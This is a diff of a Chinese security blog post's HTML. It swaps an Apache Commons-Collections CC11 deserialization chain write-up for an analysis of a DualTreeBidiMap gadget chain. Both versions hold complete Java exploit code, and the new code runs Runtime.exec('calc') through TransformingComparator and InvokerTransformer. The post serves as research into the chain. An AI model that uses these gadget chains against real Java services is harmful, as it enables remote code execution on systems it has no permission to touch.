@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Java 反序列化 Commons-Collections 篇 CC11 链, 让我再浪一会">
-    <meta name="description" content="Java 反序列化 Commons-Collections 篇 CC11 链">
+    <meta name="keywords" content="Java 反序列化 Commons-Collections 篇 DualTreeBidiMap 链, 让我再浪一会">
+    <meta name="description" content="Java 反序列化 Commons-Collections 篇 DualTreeBidiMap 链">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Java 反序列化 Commons-Collections 篇 CC11 链 | 让我再浪一会</title>
+    <title>Java 反序列化 Commons-Collections 篇 DualTreeBidiMap 链 | 让我再浪一会</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -290,12 +290,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Java 反序列化 Commons-Collections 篇 CC11 链</h1>
+                    <h1 class="description center-align post-title">Java 反序列化 Commons-Collections 篇 DualTreeBidiMap 链</h1>
                 </div>
             </div>
         </div>
@@ -361,7 +361,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    416
+                    630
                 </div>
                 
 
@@ -386,80 +386,91 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Java-反序列化-Commons-Collections-篇-CC11-链"><a href="#Java-反序列化-Commons-Collections-篇-CC11-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 CC11 链"></a>Java 反序列化 Commons-Collections 篇 CC11 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>CC11 更像是 CC2 与 CC6 的结合，主要是用于避免Shiro-550反序列化时的一个问题：<strong>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。</strong></p>
+                <h1 id="Java-反序列化-Commons-Collections-篇-DualTreeBidiMap-链"><a href="#Java-反序列化-Commons-Collections-篇-DualTreeBidiMap-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 DualTreeBidiMap 链"></a>Java 反序列化 Commons-Collections 篇 DualTreeBidiMap 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>在 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232415">Java反序列化之与JDK版本无关的利用链挖掘</a> 文章结尾处提到了 DualTreeBidiMap，这里也跟进分析一下</p>
 <h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul>
-<li><p>java 17.0.5</p>
+<li><p>java 1.8.0_352</p>
 </li>
-<li><p>commons-collections 3.2.1</p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>commons-collections 4.0</p>
+</li>
 </ul>
-<h2 id="3-CC11-链-EXP-编写"><a href="#3-CC11-链-EXP-编写" class="headerlink" title="3. CC11 链 EXP 编写"></a>3. CC11 链 EXP 编写</h2><p>东拼西凑一下</p>
+<h2 id="3-DualTreeBidiMap-链分析"><a href="#3-DualTreeBidiMap-链分析" class="headerlink" title="3. DualTreeBidiMap 链分析"></a>3. DualTreeBidiMap 链分析</h2><p>查看 readObject()</p>
+<p><img src="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/image-20230130164619203.png"></p>
+<p>和 DualHashBidiMap 相同，一样是调用 putAll() 方法来处理传入的 map，但是这里的 maps 被赋值为 TreeMap 并使用 comparator 进行初始化</p>
+<p>看一下 comparator 值从哪里来</p>
+<p><img src="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/image-20230130172117741.png"></p>
+<p>在构造函数中可以控制 comparator 的值</p>
+<p>在 DualHashBidiMap 中使用 HashMap.containsKey() 方法调用 TiedMapEntry.hashCode() 方法，这里查看下 TreeMap.containsKey() 方法是否能一样利用</p>
+<p><img src="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/image-20230130164814593.png"></p>
+<p>调用 TiedMapEntry.getEntry() 方法进一步处理 key ，跟进查看一下</p>
+<p><img src="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/image-20230130164836711.png"></p>
+<p>可以发现不再调用 hashCode() 方法，这里看到在 comparator 不为空的情况下会去调用 getEntryUsingComparator() 方法<img src="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/image-20230130165036056.png"></p>
+<p>存在 compare() 方法调用但是这里的 root 不好控制，containsKey() 方法用不了了再回去看 putAll 方法</p>
+<p><img src="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/image-20230130171145595.png"></p>
+<p>还调用了 TreeMap.put() 方法</p>
+<p><img src="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/image-20230130171403954.png"></p>
+<p>在 root 为空的情况下调用了 compare() 方法，而这里的 root 默认为空也就是说可以直接进入到 compare() 方法中</p>
+<p><img src="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/image-20230130171745165.png"></p>
+<p>这里 compare 的处理也很简单，判断 comparator 是否为空，不为空的情况下直接调用 comparator.compare() 方法</p>
+<p>查看下这里的  comparator 如何控制</p>
+<p><img src="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/image-20230130172802513.png"></p>
+<p>也是在构造函数中进行赋值，都可控的情况下就需要一个危险的 compare() 方法，而在 CC2 中使用到了 TransformingComparator，这个类的 compare 方法可以调用 transform 方法，但是这个类只能在 4.0 版本下才可以进行序列化</p>
+<p><img src="/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/image-20230130165451783.png"></p>
+<p>到此利用链就很明确了</p>
+<h3 id="3-1-利用链"><a href="#3-1-利用链" class="headerlink" title="3.1 利用链"></a>3.1 利用链</h3><pre class="line-numbers language-none"><code class="language-none">DualTreeBidiMap.readObject()
+AbstractDualBidiMap.putAll()
+AbstractDualBidiMap.put()
+TreeMap.put()
+TreeMap.compare()
+TransformingComparator.compare()
+ChainedTransformer.transform()
+ConstantTransformer.transform()
+InvokerTransformer.transform()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="4-DualTreeBidiMap-链-EXP-编写"><a href="#4-DualTreeBidiMap-链-EXP-编写" class="headerlink" title="4. DualTreeBidiMap 链 EXP 编写"></a>4. DualTreeBidiMap 链 EXP 编写</h2><ul>
+<li>Exploit</li>
+</ul>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
 
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>bidimap<span class="token punctuation">.</span></span><span class="token class-name">DualTreeBidiMap</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
 
 <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
 <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>
 
 <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
-        <span class="token comment">// CC2 部分加载字节码</span>
-        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">// 绕过 if 确保进入</span>
-        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_class"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">// 写入字节码</span>
-        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">DualTreeBidiMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> dualTreeBidiMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DualTreeBidiMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">,</span> transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        dualTreeBidiMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> iTransformers <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        iTransformers<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        iTransformers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token comment">// CC6 部分</span>
-        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> expHashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        expHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"factory"</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        hashMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token comment">// 执行序列化与反序列化</span>
+        <span class="token comment">// 序列化</span>
         <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expHashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>dualTreeBidiMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
         objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
+        <span class="token comment">// 反序列化</span>
         <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
         objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>
-        <span class="token class-name">Field</span> targetField <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        targetField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        targetField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h2><p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/commonscollections11%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">CommonsCollections11利用链分析</a></p>
 
                 
             </div>
@@ -486,7 +497,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://nah-v0.github.io/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-cc11-lian/">https://nah-v0.github.io/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-cc11-lian/</a>
+                    <a href="https://nah-v0.github.io/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/">https://nah-v0.github.io/2023/01/30/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -850,19 +861,19 @@
